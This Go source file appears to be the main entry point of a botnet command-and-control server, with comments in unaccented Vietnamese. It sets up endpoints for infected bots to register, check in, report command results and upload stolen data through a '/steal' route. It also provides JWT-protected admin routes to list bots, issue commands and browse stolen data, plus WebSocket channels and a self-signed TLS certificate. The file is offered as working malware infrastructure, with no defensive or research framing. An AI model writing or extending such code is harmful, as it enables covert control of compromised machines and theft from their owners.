package main

import (
    "crypto/ecdsa"
    "crypto/elliptic"
    "crypto/rand"
    "crypto/tls"
    "crypto/x509"
    "crypto/x509/pkix"
    "encoding/pem"
    "log"
    "math/big"
    "net/http"
    "os"
    "time"
    
    "github.com/gin-gonic/gin"
)

func main() {
    log.SetFlags(log.LstdFlags | log.Lshortfile)
    log.Println("=========================================")
    log.Println("  C2 BOTNET SERVER - KHOI DONG")
    log.Println("  Google Cloud Free Tier Edition")
    log.Println("=========================================")
    
    // Khoi tao config
    InitConfig()
    
    // Khoi tao database
    InitDatabase()
    defer DB.Close()
    
    // Thiet lap router Gin
    gin.SetMode(gin.ReleaseMode)
    router := gin.New()
    router.Use(gin.Recovery())
    router.Use(CORSMiddleware())
    router.Use(RateLimitMiddleware())
    
    // Phuc vu file tinh cho Web Panel
    router.StaticFile("/", "./panel.html")
    router.StaticFile("/panel", "./panel.html")
    router.StaticFile("/panel.html", "./panel.html")
    router.StaticFile("/style.css", "./style.css")
    router.StaticFile("/app.js", "./app.js")
    router.Static("/assets", "./assets")
    
    // API endpoints
    api := router.Group("/api")
    {
        // Endpoints cho bot (khong can xac thuc JWT)
        api.POST("/register", HandleRegister)
        api.POST("/checkin", HandleCheckin)
        api.POST("/result", HandleResult)
        api.POST("/steal", HandleSteal)
        api.GET("/health", HandleHealthCheck)
        
        // Endpoints cho admin (can JWT)
        admin := api.Group("")
        admin.Use(JWTAuthMiddleware())
        {
            admin.POST("/login", HandleLogin) // Login khong can JWT trong group con
            admin.GET("/bots", HandleGetBots)
            admin.GET("/bots/:id", HandleGetBotDetail)
            admin.POST("/command", HandleSendCommand)
            admin.GET("/commands", HandleGetCommands)
            admin.GET("/steals", HandleGetSteals)
            admin.GET("/stats", HandleGetStats)
        }
    }
    
    // Cho phep login khong can JWT
    
    // WebSocket endpoints
    router.GET("/ws", HandleBotWebSocket)
    router.GET("/ws/admin", HandleAdminWebSocket)
    
    // Goroutine don dep bot offline moi 5 phut
    go func() {
        for {
            time.Sleep(AppConfig.CleanupInterval)
            CleanupOfflineBots()
        }
    }()
    
    // Goroutine xoa lenh cu moi 1 gio
    go func() {
        for {
            time.Sleep(1 * time.Hour)
            CleanupOldCommands()
        }
    }()
    
    // Goroutine don dep rate limiter
    go func() {
        for {
            time.Sleep(5 * time.Minute)
            limiter.Cleanup()
        }
    }()
    
    // Kiem tra TLS cert, neu chua co thi tu sinh
    if _, err := os.Stat(AppConfig.CertFile); os.IsNotExist(err) {
        log.Println("[TLS] Chung chi khong tim thay, dang tu sinh...")
        generateSelfSignedCert(AppConfig.CertFile, AppConfig.KeyFile)
    }
    
    // Tao TLS config
    tlsConfig := &tls.Config{
        MinVersion: tls.VersionTLS12,
        CurvePreferences: []tls.CurveID{
            tls.X25519,
            tls.CurveP256,
        },
    }
    
    server := &http.Server{
        Addr:      ":" + AppConfig.Port,
        Handler:   router,
        TLSConfig: tlsConfig,
    }
    
    log.Printf("[SERVER] Dang lang nghe tren cang %s (TLS)", AppConfig.Port)
    log.Printf("[SERVER] Web Panel: https://%s:%s/", AppConfig.Domain, AppConfig.Port)
    
    err := server.ListenAndServeTLS(AppConfig.CertFile, AppConfig.KeyFile)
    if err != nil {
        log.Fatal("[SERVER] Loi khoi dong server: ", err)
    }
}

// Tu sinh chung chi TLS su dung ECDSA P-256
func generateSelfSignedCert(certFile string, keyFile string) {
    // Tao private key
    privateKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
    if err != nil {
        log.Fatal("[TLS] Khong the tao private key: ", err)
    }
    
    // Tao template chung chi
    template := x509.Certificate{
        SerialNumber: big.NewInt(1),
        Subject: pkix.Name{
            Organization: []string{"C2 Server"},
            CommonName:   AppConfig.Domain,
        },
        NotBefore:             time.Now(),
        NotAfter:              time.Now().Add(365 * 24 * time.Hour), // 1 nam
        KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
        ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
        BasicConstraintsValid: true,
        DNSNames:              []string{AppConfig.Domain, "localhost"},
        IPAddresses:           nil,
    }
    
    // Tao chung chi
    certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
    if err != nil {
        log.Fatal("[TLS] Khong the tao chung chi: ", err)
    }
    
    // Luu private key
    keyFileOut, err := os.Create(keyFile)
    if err != nil {
        log.Fatal("[TLS] Khong the tao file key: ", err)
    }
    defer keyFileOut.Close()
    
    keyBytes, err := x509.MarshalECPrivateKey(privateKey)
    if err != nil {
        log.Fatal("[TLS] Khong the marshal private key: ", err)
    }
    
    pem.Encode(keyFileOut, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyBytes})
    
    // Luu chung chi
    certFileOut, err := os.Create(certFile)
    if err != nil {
        log.Fatal("[TLS] Khong the tao file cert: ", err)
    }
    defer certFileOut.Close()
    
    pem.Encode(certFileOut, &pem.Block{Type: "CERTIFICATE", Bytes: certDER})
    
    log.Printf("[TLS] Da tu sinh chung chi: %s / %s", certFile, keyFile)
}
